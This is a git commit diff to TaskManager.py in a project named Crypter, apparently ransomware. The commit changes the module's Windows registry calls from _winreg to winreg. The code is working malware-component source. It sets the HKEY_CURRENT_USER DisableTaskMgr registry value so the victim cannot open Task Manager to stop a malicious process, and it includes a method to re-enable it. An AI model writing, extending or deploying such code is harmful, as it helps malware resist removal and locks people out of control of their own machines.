e1d0127c80d9b6ea5b6b3b79c675057707e9d522
sithis <mattlsutton1993@gmail.com>
2020-04-25 01:05:08 +0100

    Fixed winreg import

--- Crypter/Crypter/TaskManager.py
+++ Crypter/Crypter/TaskManager.py
@@ -33,27 +33,27 @@ class TaskManager(object):
 
         # Try to read the key
         try:
-            reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.DISABLE_KEY_LOCATION)
-            disabled = _winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
-            _winreg.CloseKey(reg)
+            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.DISABLE_KEY_LOCATION)
+            disabled = winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
+            winreg.CloseKey(reg)
             key_exists = True
         except:
             pass
         
         # If key doesn't exist, create it and set to disabled
         if not key_exists:
-            reg = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, 
+            reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                   self.DISABLE_KEY_LOCATION)
-            _winreg.SetValueEx(reg, "DisableTaskMgr", 0,  _winreg.REG_DWORD, 0x00000001)
-            _winreg.CloseKey(reg)
+            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
+            winreg.CloseKey(reg)
         # If enabled, disable it
         elif key_exists and not disabled:
-            reg = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 
+            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   self.DISABLE_KEY_LOCATION,
                                   0,
-                                  _winreg.KEY_SET_VALUE)
-            _winreg.SetValueEx(reg, "DisableTaskMgr", 0,  _winreg.REG_DWORD, 0x00000001)
-            _winreg.CloseKey(reg)
+                                  winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
+            winreg.CloseKey(reg)
 
     
     def enable(self):
@@ -64,21 +64,21 @@ class TaskManager(object):
         
         # Try to read the key
         try:
-            reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.DISABLE_KEY_LOCATION)
-            disabled = _winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
-            _winreg.CloseKey(reg)
+            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.DISABLE_KEY_LOCATION)
+            disabled = winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
+            winreg.CloseKey(reg)
             key_exists = True
         except:
             pass
             
         # If key exists and is disabled, enable it
         if key_exists and disabled:
-            reg = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 
+            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   self.DISABLE_KEY_LOCATION,
                                   0,
-                                  _winreg.KEY_SET_VALUE)
-            _winreg.SetValueEx(reg, "DisableTaskMgr", 0,  _winreg.REG_DWORD, 0x00000000)
-            _winreg.CloseKey(reg)
+                                  winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000000)
+            winreg.CloseKey(reg)
                 
     
 if __name__ == "__main__":
